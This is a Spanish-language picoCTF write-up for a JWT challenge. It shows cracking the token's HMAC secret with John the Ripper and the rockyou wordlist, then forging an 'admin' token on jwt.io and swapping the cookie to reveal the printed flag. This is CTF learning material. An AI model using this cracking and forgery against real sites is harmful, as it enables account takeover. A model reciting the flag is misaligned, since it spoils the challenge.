## Objetivo 

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864

---
## Datos de acceso al nivel 

http://jupiter.challenges.picoctf.org:61864

---
## Solución 
lo primero es acceder a la pagina http://jupiter.challenges.picoctf.org:61864

![[Pasted image 20231009221200.png]]

después nos tenemos que registrar con con nuestro nombre 

![[Pasted image 20231009221255.png]]

dentro lo único que tenemos que hacer es usar una herramienta que nos permita ver las cookies en mi caso use la herramienta [Cookie-Editor - Microsoft Edge Addons](https://microsoftedge.microsoft.com/addons/detail/cookieeditor/neaplmfkghagebokkhpjpoebhdledlfi)

![[Pasted image 20231009221433.png]]

prestamos atención al campo jwt y copiamos el valor, en mi caso 

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiVGFkZW8ifQ.RmvxOEWZqsbVm2pwekITizBHt1Ra1OvW6zR3hdG2OMg
```

una ves tenemos este valor debemos guardarlo en un archivo para procesarlo en una terminal Linux

```bash
touch hash   

echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiVGFkZW8ifQ.RmvxOEWZqsbVm2pwekITizBHt1Ra1OvW6zR3hdG2OMg" >> hash   
```

después de tener nuestro archivo debemos verificar nuestro diccionario de palabras para el ataque, esto se hace de la siguiente forma 

``` bash
ls /usr/share/wordlists/  
# amass  dirb  dirbuster  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt.gz  sqlmap.txt  wfuzz  wifite.txt 

sudo gzip -d  /usr/share/wordlists/rockyou.txt.gz
#[sudo] password for kali: 

ls /usr/share/wordlists                          
amass  dirb  dirbuster  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt  sqlmap.txt  wfuzz  wifite.txt

head /usr/share/wordlists/rockyou.txt 
# 123456
# 12345
# 123456789
# password
# iloveyou
# princess
# 1234567
# rockyou
# 12345678
# abc123
```

después de hacer esto, en la carpeta o ruta donde tenemos nuestro archivo anteriormente creado se hace lo siguiente  

``` bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt 

# Using default input encoding: UTF-8
# Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
# Will run 2 OpenMP threads
# Press 'q' or Ctrl-C to abort, almost any other key for status
# ilovepico        (?)     
# 1g 0:00:00:08 DONE (2023-10-10 00:51) 0.1213g/s 897739p/s 897739c/s 897739C/s # iloverob4live345..ilovemymother@
# Use the "--show" option to display all of the cracked passwords reliably

```

como podemos ver la contraseña es `ilovepico` por lo que ahora solo queda ir al sitio [JSON Web Tokens - jwt.io](https://jwt.io/#debugger-io) y pegar la cookie que metimos en el archivo

![[Pasted image 20231009225435.png]]

como podemos ver una ves ingresada nos muestra algo de información, lo que tenemos que hacer es cambiar el nombre de usuario `user` por la palabra `admin`

![[Pasted image 20231009225457.png]]

después de esto solo queda ingresar la contraseña `ilovepico` en el siguiente campo 
![[Pasted image 20231009230712.png]]

![[Pasted image 20231009225900.png]]

una ves hecho esto copeamos nuevamente la cookie que ahora esta modificada 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```

volvemos a la pagina http://jupiter.challenges.picoctf.org:61864 justo donde estábamos logeados 
y modificamos la cookie cambiándola por la nueva, esto con ayuda de la extensión que teníamos ya descargada 

![[Pasted image 20231009225553.png]]

ya guardada solo tenemos que refrescar la pagina y la contraseña aparecerá

![[Pasted image 20231009231051.png]]

**Resultado Final**
```
picoCTF{jawt_was_just_what_you_thought_1ca14548}
```

---
## Notas Adicionales 

---
## Referencias 
[JSON - Wikiwand](https://www.wikiwand.com/en/JSON)
[JSON Web Token Introduction - jwt.io](https://jwt.io/introduction)
[JSON Web Tokens - jwt.io](https://jwt.io/#debugger-io)
https://microsoftedge.microsoft.com/addons/detail/cookieeditor/neaplmfkghagebokkhpjpoebhdledlfi


